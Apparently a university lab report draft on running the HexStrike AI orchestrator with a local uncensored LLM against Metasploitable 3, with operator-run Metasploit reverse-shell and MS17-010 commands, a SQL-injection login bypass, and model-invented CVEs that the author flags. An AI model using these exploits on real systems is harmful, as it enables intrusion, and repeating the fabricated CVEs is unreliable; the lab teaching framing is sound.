# AI Security Orchestrator: HexStrike AI + Local LLM

**Ethical Hacking — Saint Joseph University, Faculty of Engineering, Master in Cybersecurity (INCI, Semester 3)**

*Author: [YOUR NAME] · Date: 2026-10 · Authorized, isolated laboratory exercise*

> **Draft status:** This is a working draft built from the work actually performed and verified.
> Placeholders marked `[SCREENSHOT: …]`, `[TODO: …]` and `[INSERT …]` are items for you to add or run.
> Review and adapt the wording to your own voice before submission.

---

## Abstract / Summary

This report documents the installation, local-LLM integration and evaluation of **HexStrike AI**, an
MCP-based AI security orchestrator, driven by a **local large language model** served with Ollama, in a
fully isolated two-machine laboratory. The local model selects and drives HexStrike's security tools
with no cloud dependency. The environment was validated end-to-end against **Metasploitable 3**: the
model performed reconnaissance and vulnerability identification, and three vulnerabilities across the two
lab targets were exploited (operator-run) to obtain remote shells — ProFTPD RCE and a payroll SQL
injection on the Ubuntu host, and the SMB MS17-010 weakness on the Windows host. The report also covers the
limitations observed (including the model's unreliable vulnerability conclusions), a critical discussion of
the approach, and governance recommendations, including a one-page Risks and Safeguards sheet.

As an addition **beyond the base requirement**, a governed incident-management platform was built around
the orchestrator to demonstrate traceability, operational security and human-oversight safeguards — the
assessment criteria the assignment explicitly values. It is labelled as such throughout and is not
presented as a required deliverable.

---

## 1. Architecture

### 1.1 Laboratory topology

Two laptops on a dedicated, air-gapped Ethernet segment (`192.168.50.0/24`), connected by a direct cable:

```
            Laptop 1 — Windows 11 (Blue team / platform)        Laptop 2 — Kali Linux (Red team / orchestrator)
            192.168.50.1                                         192.168.50.2 (host "zein-worker")
        ┌─────────────────────────────┐                     ┌──────────────────────────────────────────────┐
        │  Incident platform (bonus)  │   SSH tunnel        │  Ollama (local LLM)  ──┐                       │
        │  - ASP.NET Core API         │   9443 (gateway)    │   127.0.0.1:11434      │ MCP tool-calling      │
        │  - Angular SPA              │   11434 (Ollama)    │                        ▼                       │
        │  - bounded mTLS gateway ────┼────────────────────▶│  hexstrike_mcp ──▶ hexstrike_server (:8888) ──▶ 150+ tools
        └─────────────────────────────┘                     │                                          │     │
                                                             │                                          ▼     │
                                                             │                          VMware (bridged) targets:
                                                             │                          Metasploitable3-win    192.168.50.10
                                                             │                          Metasploitable3-ubuntu 192.168.50.11
                                                             └──────────────────────────────────────────────┘
```

*The clean figure below replaces the sketch above.*

![Figure 1 — Two-laptop lab architecture](evidence/screenshots/C3-architecture.png)

### 1.2 Observed HexStrike architecture (personal description)

HexStrike AI is distributed as a Kali package and runs as two cooperating processes:

- **`hexstrike_server`** — an HTTP API server (default `127.0.0.1:8888`) that actually executes the
  security tools. It exposes a `/health` endpoint, an intelligent decision/recovery engine, per-tool
  availability, caching and telemetry. On this host it reported **version 6.0.0**, `status: healthy`,
  **82 of 127 tools available**.
- **`hexstrike_mcp`** — an MCP (Model Context Protocol) server built on FastMCP that connects to the API
  server and exposes its **150 tools** to any MCP-capable AI client over stdio. This is the surface an
  AI agent drives.

The "multi-agent architecture / intelligent decision engine / 12+ agents / 150+ tools" described by the
project map onto: the MCP tool catalogue (150 tools), the server-side decision & recovery logic
(parameter optimisation, timeout recovery), and the reasoning performed by the connected LLM, which acts
as the orchestrating agent.

### 1.3 Two integration paths used

1. **Native AI orchestrator (the assignment's core).** The local Ollama model is the reasoning engine; a
   small MCP client (`hexstrike_agent.py`) connects the model to `hexstrike_mcp`. The model is given the
   tool schemas and decides which tools to call; HexStrike executes them. Fully local, no cloud LLM.
2. **Governed platform (bonus, beyond requirement).** The incident-management platform calls HexStrike
   through a bounded, mutually-authenticated (mTLS) gateway that only permits a reviewed allow-list of
   reconnaissance/scanning tools, with RBAC, per-target approval and full audit. It also includes an
   in-app "AI Orchestrator" that drives the same bounded tool-set with the local model, and an LLM
   analysis panel. Exploitation is deliberately **not** reachable through this path.

---

## 2. Choice of the Local LLM

**Selected model:** `huihui_ai/qwen2.5-abliterate:14b`, served by **Ollama 0.40.2**.

### 2.1 Technical specification sheet

| Property | Value |
|---|---|
| Base family | Qwen2.5 (14.8 B parameters) |
| Quantisation | Q4_K_M (GGUF) |
| On-disk size | ~9.0 GB |
| Context length | 32 768 tokens (8 192 used in integration) |
| Capabilities | `completion`, **`tools`** (function calling) |
| Runtime | Ollama (llama.cpp), CPU-only on this host |
| Endpoint | `http://127.0.0.1:11434` (loopback) |

### 2.2 Justification against the required criteria

- **Confidentiality.** The model runs entirely on the local machine; the integration restricts the
  endpoint to a loopback/RFC1918 address (public endpoints are rejected in code). No prompt, scan result
  or finding ever leaves the lab.

![Figure 2 — Local model parameters: Q4_K_M, 14.8B, 32k context, tool-calling (`/api/tags`)](evidence/screenshots/B4-model-params.jpg)

![Figure 3 — Ollama (11434) and HexStrike (8888) bound to loopback only — requests stay local](evidence/screenshots/B5-loopback-ports.jpg)
- **Memory consumption.** ~9 GB on disk; fits in RAM for CPU inference on the lab laptop. A 14 B Q4 model
  is a deliberate balance: large enough to follow multi-step tool-use instructions, small enough to run
  without a datacentre GPU.
- **Hardware compatibility.** Runs on a standard laptop (Lenovo ThinkPad) with **no NVIDIA GPU** — Ollama
  reports `size_vram: 0`, i.e. pure CPU inference. This is the main driver of latency (see §7).
- **Latency.** Measured on this hardware (see §2.3) — acceptable for a documented, human-paced exercise
  but too slow for real-time use.
- **Ease of integration.** Ollama exposes a simple REST API with OpenAI-style tool-calling, which the MCP
  agent and the platform both consume with a few lines of code.
- **Why an "abliterate" variant.** For the educational offensive walkthrough the uncensored variant avoids
  spurious refusals in the clearly authorized lab context; it is not used to bypass any safety control in
  the exploitation path (which is operator-run, see §5).

### 2.3 Response-time measurements (≥3 trials)

Verifying the model responds locally and measuring response time (all on the CPU-only host):

| # | Operation | Prompt size | Wall time |
|---|---|---|---|
| 1 | Single tool-calling decision (`nmap_scan` emitted for a target) | small | **~78 s** |
| 2 | Defensive analysis of scan evidence (completed) | bounded evidence | **~60–78 s** |
| 3 | Defensive analysis of a larger finding set (completed) | bounded evidence | **~140 s** |
| 4 | Multi-step orchestration — model decision per step | growing context | **~310–1020 s** |

> Trials 1–3 are clean single-call measurements; trial 4 shows how decision latency grows as the
> conversation/context grows during a multi-step run. The per-step "decided in Xs" values in the
> orchestration transcripts (§4–§5 figures) are the authoritative on-setup LLM response times.

![Figure 4 — The model responds locally](evidence/screenshots/B3-local-reply.jpg)

![Figure 5 — Repeated local HexStrike health latency (three trials)](evidence/screenshots/B6-latency-trials.jpg)

---

## 3. Installation Steps

### 3.1 HexStrike AI (Kali)
- Installed from the Kali package `hexstrike-ai` (snapshot `0.0~git20260306.8333779`).
- Binaries: `/usr/bin/hexstrike_server`, `/usr/bin/hexstrike_mcp`; files under `/usr/share/hexstrike-ai`.
- Started the API server: `hexstrike_server` (listens on `127.0.0.1:8888`).
![Figure 6 — HexStrike package installed (dpkg / files / binaries)](evidence/screenshots/A1-install.jpg)

![Figure 7 — hexstrike_server startup banner (port 8888, command timeout, v6.0.0)](evidence/screenshots/A2-server-banner.jpg)

![Figure 8 — HexStrike operational: `/health` reports healthy, v6.0.0, 82/127 tools](evidence/screenshots/A3-health.jpg)

### 3.2 Local LLM (Kali)
- Installed Ollama; pulled the model: `ollama pull huihui_ai/qwen2.5-abliterate:14b`.
- Verified it responds locally: `ollama run huihui_ai/qwen2.5-abliterate:14b "Reply with exactly: LOCAL MODEL READY"` → `LOCAL MODEL READY`.
![Figure 9 — Ollama version](evidence/screenshots/B1-ollama-version.jpg)

![Figure 10 — Installed model (`ollama list`)](evidence/screenshots/B2-model-list.jpg)

### 3.3 Orchestrator client
- `hexstrike_agent.py` — a ~90-line Python MCP client (uses the system `mcp` package) that connects the
  Ollama model to `hexstrike_mcp`, exposes a curated tool-set, and runs the reason→call-tool→observe loop,
  logging the full transcript. (Source listed in the Appendix.)

### 3.4 Governed platform (bonus)
- ASP.NET Core API + Angular SPA on Laptop 1; a provisioned Python gateway on Kali (mTLS, bearer token).
- `[Reference: scripts/provision-kali-gateway.py and docs/two-laptop-assessment-architecture.md]`

---

## 4. Evidence of Connectivity

- **hexstrike_mcp ⇄ hexstrike_server.** On launch, `hexstrike_mcp` logs: *"Successfully connected to
  HexStrike AI API Server at http://127.0.0.1:8888 … Server health status: healthy … Version: 6.0.0 …
  Ready to serve AI agents"*, then lists 150 tools.

![Figure 11 — hexstrike_mcp connected to the HexStrike server (healthy, v6.0.0)](evidence/screenshots/C1-mcp-connect.jpg)
- **Local LLM ⇄ HexStrike (orchestrator communicates with the model).** The agent run log shows the model
  selecting HexStrike tools and HexStrike returning results — e.g. the model called `nmap_scan` then
  `enum4linux_scan`, read each result, and produced a final analysis.

![Figure 12 — The local LLM driving HexStrike tools over MCP (agent transcript)](evidence/screenshots/C2-agent-run-qwen-log.jpg)
- **No cloud dependency.** Both the model (`127.0.0.1:11434`) and HexStrike (`127.0.0.1:8888`) are local;
  the lab segment has no Internet path during assessment.

![Figure 13 — Local tool inventory (82/127 tools available, v6.0.0) — no cloud dependency](evidence/screenshots/A4-health-tools-count.jpg)

### Advantages of a local deployment (confidentiality, auditability, control)

Running the orchestrator and model locally keeps all targets, scan output and findings inside the lab —
**confidentiality** by construction. Every tool invocation and model decision is **auditable**: the agent
logs the full transcript, and the governed platform additionally records each action in a tamper-evident
audit trail. The operator keeps full **control**: the tool-set, the targets and the trigger are all
constrained locally, with no third-party model provider in the loop.

---

## 5. Description of the Scenarios Executed

### 5.1 Reconnaissance — megacorpone
Passive/OSINT reconnaissance of `megacorpone.com` (OffSec's public training target), run from Kali over
its Internet connection (separate from the isolated lab segment). Tools: `whois`, `host`/`dig`,
`theHarvester`, and DNS enumeration. Full output: [docs/evidence/megacorpone-recon.txt](evidence/megacorpone-recon.txt).
![Figure 14 — megacorpone WHOIS](evidence/screenshots/D1-whois.jpg)

![Figure 15 — megacorpone DNS records (SOA/NS/MX/A/TXT)](evidence/screenshots/D2-dns-records.jpg)

![Figure 16 — Zone transfer (AXFR) refused on the name servers](evidence/screenshots/D3-axfr-refused.jpg)

**WHOIS.** Registrar **Gandi SAS**; registrant **"Alan Grofield", MegaCorpOne, 2 Old Mill St, Rachel,
Nevada, US**; created 2013-01-22; name servers `NS1/NS2/NS3.MEGACORPONE.COM`; **DNSSEC unsigned**.

**DNS records.** `A` → `149.56.244.87`; `MX` → `mail`/`mail2.megacorpone.com` and Gandi mail; `NS` →
ns1/ns2/ns3; `TXT` → `"Try Harder"` and a `google-site-verification` token; SOA admin `admin.megacorpone.com`.

**Zone transfer (AXFR).** Attempted against all three name servers — **all refused** (`; Transfer failed.`).
Zone transfer is correctly disabled (a positive security control; no bulk zone dump available).

**Subdomain enumeration (DNS brute-force).** 18 hosts discovered — most internal services sit in the
`167.114.21.0/24` range:

| Host | IP | | Host | IP |
|---|---|---|---|---|
| www / www2 | 149.56.244.87 | | siem | 167.114.21.71 |
| admin | 167.114.21.64 | | snmp | 167.114.21.72 |
| beta | 167.114.21.65 | | syslog | 167.114.21.73 |
| fs1 | 167.114.21.66 | | support | 167.114.21.74 |
| intranet | 167.114.21.67 | | test | 167.114.21.75 |
| mail | 167.114.21.68 | | vpn | 167.114.21.76 |
| mail2 | 167.114.21.69 | | ns1 | 51.79.37.18 |
| router | 167.114.21.70 | | ns2 / ns3 | 51.222.39.63 / 66.70.207.180 |

This maps MegaCorpOne's externally-visible attack surface (mail, VPN, router, intranet, and monitoring
hosts — siem/snmp/syslog) before any active engagement. Active scanning of these public hosts was not
performed (out of scope for this exercise; the Metasploitable 3 targets are used for scanning/exploitation).

### 5.2 Metasploitable 3 — Scanning *(AI-orchestrated)*
The local model, driving HexStrike, ran `nmap_scan` against `192.168.50.11` and identified the open
services: **FTP — ProFTPD 1.3.5 (21)**, **SSH — OpenSSH 6.6.1p1 (22)**, **HTTP — Apache 2.4.7 (80)**,
**SMB — Samba 3.x/4.x (445)**, **MySQL (3306)**.

![Figure 17 — nmap service scan of 192.168.50.11 (in-app, rendered as a readable table)](evidence/screenshots/E2-app-nmap-table.jpg)

### 5.3 Metasploitable 3 — Vulnerability testing *(AI-orchestrated)*
The model then ran `enum4linux_scan` (target info, Samba workgroup, discovered user `chewbacca`) and
concluded that the **Samba service (445) — CVE-2017-7494** was the most likely exploitable weakness.
In earlier runs against Metasploitable3 Windows targets, the SMB **MS17-010 / CVE-2017-0143 (EternalBlue
family)** vulnerability was detected (High).

![Figure 18 — AI-orchestrated enumeration and vulnerability identification (steps 2–3)](evidence/screenshots/C2-agent-run-steps.jpg)

A second, in-platform AI Orchestrator run focused specifically on the SMB service to assess the Samba
hypothesis. From a single natural-language task the local model independently selected `enum4linux_scan`,
then `smbmap` and `nmap_advanced_scan`, each through the bounded gateway. The run also illustrates the
policy in action: when the model attempted `nmblookup` — a tool outside the reviewed allow-list — the
gateway **rejected** it and the model recovered by choosing an allowed tool, confirming that the model can
only ever drive the reviewed, bounded tool-set.

![Figure 19 — AI-driven SMB enumeration; note the gateway rejecting an unavailable tool (`nmblookup`) and the model recovering](evidence/screenshots/F1-samba-orchestration-enum.png)

### 5.4 Metasploitable 3 — Verifying the AI's recommendation *(operator-run)*
The AI's top recommendation (Samba / CVE-2017-7494) was **verified by hand before any exploitation** — the
core human-oversight step. The verification showed the recommendation was *plausible but did not hold in
practice*:

- **Version is in range, but the precondition is missing.** `nmap -sV` confirmed **Samba 4.3.11-Ubuntu**
  (within the 3.5.0–4.6.4 window CVE-2017-7494 affects). However, SambaCry requires a **writable share** to
  stage its shared object, and `smbmap` showed the exposed shares (`print$`, `public`, `IPC$`) as
  **Mapping: DENIED** for anonymous/guest access — no writable share was reachable.
- **The exploit did not yield a session.** The Metasploit module `exploit/linux/samba/is_known_pipename`
  failed (`Exploit completed, but no session was created`), consistent with the missing writable-share
  precondition.

![Figure 20 — Operator verification: Samba 4.3.11 (nmap -sV) is in the vulnerable version range](evidence/screenshots/F3-samba-version-nmap.png)

![Figure 21 — `smbmap` shows the Samba shares are not writable anonymously (Mapping: DENIED), so CVE-2017-7494's precondition is absent](evidence/screenshots/F2-samba-smbmap-shares.png)

![Figure 22 — The Samba exploit attempt yields no session, confirming the vulnerability is not exploitable on this host](evidence/screenshots/F4-samba-exploit-failed.png)

This is a deliberate and instructive outcome: the local model reasoned to a *technically reasonable* CVE
from the service banner, but **the recommendation did not survive hands-on validation**. A human operator
caught this and pivoted — exactly the oversight the assignment asks for. The AI narrows the search; the
human confirms what is real before acting.

### 5.5 Reliability of the model's vulnerability conclusions
Repeated orchestration runs over the *same* host exposed a clear and important limitation: the local model
is capable at **driving tools** but **unreliable at drawing vulnerability conclusions**. Each run correctly
selected and executed `nmap_scan`/enumeration, but the "most likely exploitable vulnerability" it reported
in its final summary was wrong every time — and never the one that was actually exploitable:

- **Run A (Samba).** Flagged Samba / CVE-2017-7494 — plausible, but unexploitable on this host (§5.4).
- **Run B (SSH, hallucinated CVE).** Reported SSH / **CVE-2017-15938** as a "buffer-overflow RCE". No such
  OpenSSH CVE exists; the nearest real identifier (CVE-2017-15906) is a minor sftp read-only bypass, not an
  RCE. A fabricated finding.
- **Run C (larger model — right service, wrong conclusion).** The 14 B model did recall ProFTPD's `mod_copy`
  weakness, but misclassified it as a **Denial-of-Service** under the wrong identifier (CVE-2017-12796) and
  **dismissed it**, then selected SSH / **CVE-2016-6211** (also not a real OpenSSH CVE) as its answer. In
  reality `mod_copy` in ProFTPD 1.3.5 is **CVE-2015-3306**, an unauthenticated **remote command execution** —
  exactly the weakness the operator exploited in §5.6. The model therefore pointed the operator *away* from
  the one genuinely exploitable service.

![Figure 23 — The model reports a non-existent OpenSSH CVE (CVE-2017-15938) as a remote-code-execution "most likely" finding](evidence/screenshots/G1-model-ssh-hallucinated-cve.png)

![Figure 24 — The larger model recalls ProFTPD mod_copy but misclassifies it as DoS under a wrong CVE, dismisses it, and selects a non-existent OpenSSH CVE instead](evidence/screenshots/G2-model-proftpd-misclassified.png)

Across every run the genuinely exploitable vulnerability (ProFTPD 1.3.5 mod_copy, CVE-2015-3306) was
identified and confirmed by the **human operator**, not the model. This is the empirical core of the
human-oversight argument: the local LLM is useful to **accelerate and narrow reconnaissance**, but its
conclusions — including confidently-stated CVEs — must be **validated by a human before any action**. All
CVE claims above were cross-checked against public vulnerability databases.

### 5.6 Metasploitable 3 — Exploitation *(operator-run)*
Having ruled out Samba, the operator pivoted to a weakness the same reconnaissance had surfaced. Using
Metasploit from Kali, the **ProFTPD 1.3.5 mod_copy (CVE-2015-3306)** weakness on `192.168.50.11` was
exploited (it chains the open FTP and HTTP services the scan found):

```
use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS 192.168.50.11 ; set RPORT 80 ; set SITEPATH /var/www/html
set payload cmd/unix/reverse_perl ; set LHOST 192.168.50.2 ; set LPORT 4444 ; run
→ Command shell session 1 opened (192.168.50.2:4444 -> 192.168.50.11:42123)
   id    → uid=33(www-data) gid=33(www-data)
   uname → Linux
```

A remote command shell as `www-data` was obtained.

![Figure 25 — Exploitation: ProFTPD mod_copy yields a remote shell (`id` = www-data, `uname`)](evidence/screenshots/D7-exploit-shell.jpg)

The exploitation step is **operator-run on purpose** (not executed by the autonomous agent): it keeps a
human in the loop for the only truly intrusive action, which is both a safety control and the
human-oversight posture the assignment asks for.

### 5.7 Second vulnerability — Payroll application SQL injection *(operator-run)*
The AI-driven reconnaissance had also exposed a web application, `payroll_app.php`, in the open directory
listing on port 80 (Figure 28). The operator examined it and confirmed a classic **unauthenticated SQL
injection** in its login form. Submitting `' OR 1=1 -- -` in the *User* field bypassed authentication and
returned the full employee table — a combined authentication bypass and data disclosure:

![Figure 26 — SQL-injection payload (`' OR 1=1 -- -`) submitted to the payroll login form](evidence/screenshots/H1-payroll-sqli-login.png)

![Figure 27 — The injection succeeds: authentication is bypassed and all employee records (usernames and salaries) are disclosed](evidence/screenshots/H2-payroll-sqli-dump.png)

Notably, an automated scan of the same parameter with `sqlmap` at default settings reported it as *not
injectable*, while manual testing confirmed the flaw immediately — a reminder (paralleling §5.5) that
automated tooling complements but does not replace human judgment. As with the ProFTPD exploitation, this
intrusive step was **operator-run**, not driven by the AI.

### 5.8 Windows host — MS17-010 exploitation *(operator-run)*
The second Metasploitable 3 target, the Windows host `192.168.50.10` (Windows Server 2008 R2 SP1), was
assessed for the SMB **MS17-010** weakness (the "EternalBlue" vulnerability family) that the earlier
AI-orchestrated SMB scans had flagged on Windows targets (§5.3). An AI Orchestrator run against this host
selected the MS17-010 detection tool (`nmap_advanced_scan`, which runs the `smb-vuln-ms17-010` NSE script on
TCP 445) and its summary reported the service as vulnerable. Consistent with the lesson of §5.5, that
assertion was confirmed against the actual tool evidence — the `smb-vuln-ms17-010` script reporting the host
as `State: VULNERABLE` (CVE-2017-0143):

`[SCREENSHOT: nmap smb-vuln-ms17-010 on 192.168.50.10 showing "State: VULNERABLE" (CVE-2017-0143) — pending]`

The operator then exploited it from Kali using the `ms17_010_psexec` module:

```
use exploit/windows/smb/ms17_010_psexec
set RHOSTS 192.168.50.10 ; set LHOST 192.168.50.2 ; run
→ Target OS: Windows Server 2008 R2 Standard 7601 Service Pack 1
→ Meterpreter session opened (192.168.50.2:4444 -> 192.168.50.10:49161)
   getuid  → NT AUTHORITY\SYSTEM
   sysinfo → VAGRANT-2008R2, Windows Server 2008 R2 (6.1 Build 7601, SP1), x64
```

This yielded a Meterpreter session running as **NT AUTHORITY\SYSTEM** — full administrative control of the
host. As with every intrusive step in this report, the exploitation was **operator-run**, not driven by the
AI.

![Figure 28 — MS17-010 exploitation of the Windows host (192.168.50.10): a Meterpreter session running as NT AUTHORITY\\SYSTEM](evidence/screenshots/I1-eternalblue-system.png)

### 5.9 Complete penetration test
The `192.168.50.11` work forms one coherent engagement against a single host — **reconnaissance → scanning
→ service enumeration → AI vulnerability identification → operator verification (Samba ruled out) →
exploitation (ProFTPD RCE and payroll SQL injection) → initial access and data disclosure** — and the
Windows host (`192.168.50.10`) adds a second target compromised to SYSTEM via MS17-010. In total, **three
vulnerabilities were exploited across the two targets**. The verify-and-pivot step is what makes the chain
realistic: the AI narrowed the search, and the human confirmed what was actually exploitable before acting. `[TODO: optionally add a short post-exploitation note — e.g. whoami/enumeration from the shell —
to round out the "complete" narrative.]`

---

## 6. Observed Results

- The local LLM successfully acted as the orchestrator: it chose appropriate tools unaided, consumed their
  real output, and produced a target-specific assessment (it independently flagged the Samba service /
  CVE-2017-7494 as the most likely weakness).
- Scanning and enumeration returned accurate service and host data.
- **Human verification mattered:** the AI's top recommendation (Samba) was *plausible but not exploitable*
  on this host (no anonymous writable share; the exploit yielded no session). The operator caught this and
  pivoted — a concrete demonstration of the human-oversight requirement, not a gap.
- Three vulnerabilities were exploited (operator-run) across the two targets: **ProFTPD / CVE-2015-3306**
  produced a verified remote shell (`www-data`) and an **unauthenticated SQL injection** in
  `payroll_app.php` bypassed authentication and disclosed the full employee table on the Ubuntu host, while
  the SMB **MS17-010** weakness on the Windows host yielded a Meterpreter session as **NT AUTHORITY\\SYSTEM**.
- **Vulnerability identification was unreliable (§5.5).** Across repeated runs the model's top
  "most likely exploitable" pick was wrong every time — a plausible-but-unexploitable Samba CVE, a
  fabricated OpenSSH CVE, and ProFTPD's `mod_copy` RCE misclassified as a DoS and dismissed. The one
  genuinely exploitable vulnerability was confirmed by the human, not the model.
- The governed platform demonstrated the same bounded orchestration with full RBAC and audit (bonus).

---

## 7. Limitations

- **Latency / hardware.** On a CPU-only laptop the 14 B model is slow: single decisions ~78 s, multi-step
  decisions up to ~17 minutes as context grows. Not suitable for real-time operation.
- **Tool-scoping quality.** Left unconstrained, the model chose an all-ports `nmap -sV` scan that exceeded
  HexStrike's command timeout and returned nothing; it also retried the same failing call rather than
  adapting. Bounding the scan (explicit common ports) was required to get usable results.
- **Exploitation is not autonomous.** The exploit was run by the operator, not the agent. Autonomous
  AI-driven exploitation was intentionally **not** performed (safety / oversight).
- **Vulnerability-identification reliability (§5.5).** The model is far weaker at *concluding* than at
  *orchestrating*: across repeated runs it stated non-existent CVEs with confidence (CVE-2017-15938,
  CVE-2016-6211) and misclassified a real RCE (ProFTPD `mod_copy`, CVE-2015-3306) as a DoS. CVE-level
  conclusions from the model must be treated as hypotheses and verified against authoritative sources,
  never acted on directly.
- **Model determinism.** A small local model is less reliable than a frontier cloud model at precise,
  multi-step tool orchestration.
- **Governed platform scope.** The in-app orchestrator is restricted to reviewed recon/scan tools by
  design; it cannot and does not exploit.

---

## 8. Critical Discussion

The experiment shows a local-LLM security orchestrator is **feasible and fully private**, but trades
capability and speed for confidentiality and control. The model added real value in **tool selection and
evidence interpretation** (it reasoned from scan output to a specific CVE), while its weaknesses —
**slow CPU inference and imperfect tool-scoping** — mean it assists rather than replaces an operator.

A **local** deployment is strongly preferable for authorized security work: sensitive target data never
leaves the lab, actions are auditable, and there is no dependence on a third-party provider's policies or
availability. The cost is the hardware/latency ceiling and lower reasoning reliability than a hosted
frontier model. The most defensible design keeps the AI as a **decision-support and reconnaissance**
layer with a human gating every intrusive action — which is exactly how the exploitation step was handled
here, and what the governed platform enforces structurally. `[Expand in your own words.]`

---

## 9. Governance Recommendations

- **Operator-triggered only.** Orchestration must never run autonomously; a human initiates every run and
  authorises every intrusive action. (During this work the development harness itself refused to launch an
  autonomous offensive agent — a useful reminder of this boundary.)
- **Bounded tool allow-list.** Expose only reviewed tools with bounded parameters; keep generic command
  execution and exploitation out of any automated path (as the platform's mTLS gateway does).
- **Target scoping.** Restrict targets to an explicit, approved, private (RFC1918) allow-list; reject
  public addresses in code.
- **Full auditability.** Record every request, model decision and tool execution in a tamper-evident log
  with the operator's identity (RBAC), as the platform does.
- **Confidential, local inference.** Pin the model endpoint to loopback/private; never send evidence to a
  cloud model.
- **Human oversight at exploitation.** Keep exploitation manual/confirmed, separate from reconnaissance.

---

## 10. Additional Contribution — a Governed Orchestration Platform (beyond the base requirement)

> This section describes work built *around* the assignment, not required by it. It is included because
> the assessment criteria explicitly reward traceability, operational security, documentation quality and
> the ability to propose usage safeguards — all of which this platform operationalises. It is clearly an
> extra contribution and does not replace any Part A–D deliverable.

### 10.1 What the platform is (work in progress)
The platform is a cybersecurity **incident-management / SOC application** — an ASP.NET Core Web API (.NET 10,
EF Core/MySQL) with an Angular single-page front end — built with role-based access control and a full audit
trail. Beyond the assessment integration it includes modules for incidents and cases, alerts and detection
rules, log ingestion, user-behaviour analytics (UEBA) and alert correlation. It is an **ongoing,
work-in-progress** portfolio project, **not a finished product**: several areas are still under active
development, and it is presented here to show the governance context, not as a completed deliverable.

For this assignment the relevant part is the **HexStrike + local-LLM orchestration** added to its
Assessments module. The features developed and evaluated for this report are:

- the **two assessment modes** described below (operator-selected + LLM explanation; and the AI Orchestrator);
- a **model picker** — the operator chooses between the installed local models (e.g. `qwen2.5:14b` and
  `llama3.1:8b`) in both modes, to compare them;
- **readable tool output** — raw scanner output is cleaned of terminal control codes and rendered (for
  example nmap as a port/service table) in both the assessment view and the orchestrator;
- a **Stop** control to cancel a running AI orchestration.

Figures 29–35 show the running platform — both its broader SOC surface and the assessment integration
that is the subject of this report.

![Figure 29 — Platform sign-in (the Angular single-page front end)](evidence/screenshots/J1-app-login.png)

![Figure 30 — Incident / case register, with severity, tier and SLA tracking](evidence/screenshots/J2-app-incidents.png)

![Figure 31 — Windows telemetry dashboard: event-ingestion volume and top channels](evidence/screenshots/J3-app-telemetry.png)

![Figure 32 — MITRE ATT&CK coverage matrix](evidence/screenshots/J4-app-mitre.png)

![Figure 33 — User administration and role-based access control (Administrator / Security manager / SOC analyst / RED_TEAM)](evidence/screenshots/J5-app-users.png)

![Figure 34 — Assessments module: approved lab-target selection and the bounded check categories](evidence/screenshots/J6-app-assessments.png)

![Figure 35 — The reviewed tool allow-list (24 reviewed / 35 advertised) with per-tool availability: available, needs-setup, or blocked](evidence/screenshots/J7-app-tool-catalog.png)

### 10.2 Governed assessment — two oversight modes
To use HexStrike safely and auditably, the orchestrator was wrapped in an incident-management platform
(ASP.NET Core API + Angular SPA) that mediates every call to HexStrike through a bounded,
mutually-authenticated (mTLS) gateway. All execution routes through the same **reviewed tool allow-list**
(generic command execution and exploitation are never reachable), under **role-based access control**
(a dedicated `RED_TEAM` role scoped only to the Assessments module), **per-target approval**
(private/RFC1918 addresses only), and a **full audit trail**.

Within this, the Assessments module offers **two complementary ways to run an assessment** — the same
safe tool-set, two points on the human-oversight spectrum:

**Option 1 — Operator-selected scan, then LLM explanation (human-driven).**
The operator picks a category and the exact tools to run; HexStrike executes them with bounded parameters;
the normalised results are shown in a readable form (for example nmap rendered as a port/service table,
and tool stdout/stderr cleaned of terminal control codes). The local LLM then produces an
evidence-grounded **explanation** — a defensive SOC brief or an educational exploitation walkthrough — so
the operator does not just see the raw output but understands it. *The human selects; the AI explains.*

**Option 2 — AI Orchestrator (AI-driven).**
The operator writes a natural-language task; the local LLM **decides which of the bounded tools to run**,
executes them through the same gateway, and returns a step-by-step transcript plus a final summary. A
**Stop** control cancels a run at any time. *The AI selects and runs; the human triggers and supervises.*

Together these illustrate the oversight range the assignment asks about — from fully operator-selected
with AI explanation, to AI-selected with operator supervision — **never fully autonomous, and never able
to exploit**. Completed-assessment findings are additionally auto-promoted into the platform's SOC alert
queue (as a `PenTest` source), bridging red-team output into a blue-team incident workflow.

**Mapping to the assessment criteria.**
- *Traceability:* every request, model decision and tool execution is audited and attributable to a user.
- *Operational security / safeguards:* reviewed allow-list, mTLS gateway, RBAC, private-targets-only,
  exploitation excluded by design, local-only (loopback) model endpoint.
- *Human oversight:* operator-triggered, with a Stop control; actual exploitation stays manual and outside
  the platform.
- *Documentation:* the platform, its two modes and its limits are documented alongside this report.

![Figure 36 — In-app AI Orchestrator: a run driven by the local LLM (model selectable), with a readable transcript](evidence/screenshots/E1-app-orchestration-llama.jpg)

![Figure 37 — Readable per-tool output inside the platform (smbmap)](evidence/screenshots/E2-app-smbmap-output.jpg)

**Worked example (AI-driven, web target).** Figure 38 shows a complete Option-2 run against the
authorized lab host 192.168.50.11, driven entirely by the local `qwen2.5:14b` model. From a single
natural-language task the model independently selected and executed a four-step reconnaissance chain —
`nmap_scan` → `gobuster_scan` → `katana_crawl` → `nuclei_scan` — each through the bounded gateway, and
then produced an evidence-grounded summary. The scan surfaced five open services (ProFTPD 1.3.5,
OpenSSH 6.6.1, Apache 2.4.7, Samba, CUPS) and the web crawl exposed an open directory listing that
included `payroll_app.php`, `drupal/` and `phpmyadmin/`; `nuclei` reported one low-severity hardening
observation (missing `X-Content-Type-Options: nosniff`). Figure 39 shows the readable nmap service
table from the same run. This exercises the model-selection feature end to end (a different local model
than Figure 36) and the full AI-driven mode, while exploitation of the surfaced services remained a
manual, operator-run step outside the platform.

![Figure 38 — AI Orchestrator (model `qwen2.5:14b`): from one task the local LLM autonomously selected and ran nmap → gobuster → katana → nuclei, then summarised the findings](evidence/screenshots/E3-orchestrator-qwen-run.png)

![Figure 39 — Readable nmap service inventory from the same AI-driven run (192.168.50.11: five open services)](evidence/screenshots/E4-orchestrator-nmap-services.png)

---

## Technical Appendix

- **Screenshots.** All evidence figures are embedded inline in the relevant sections above
  (Figures 1–39: architecture, HexStrike install/health, Ollama model/spec, connectivity, the
  reconnaissance, scan, the Samba verify-and-pivot, the model's unreliable vulnerability conclusions,
  enumeration, exploitation (ProFTPD RCE, payroll SQL injection, and Windows MS17-010 to SYSTEM), the
  platform's SOC and assessment surface (§10.1), and the in-app orchestrator including a full AI-driven,
  multi-tool run). The image files are in `docs/evidence/screenshots/`. **Still to add:**
  `[SCREENSHOT: Metasploitable3 VM running in VMware — pending]` and
  `[SCREENSHOT: nmap smb-vuln-ms17-010 on 192.168.50.10 showing "State: VULNERABLE" — pending]` (§5.8).
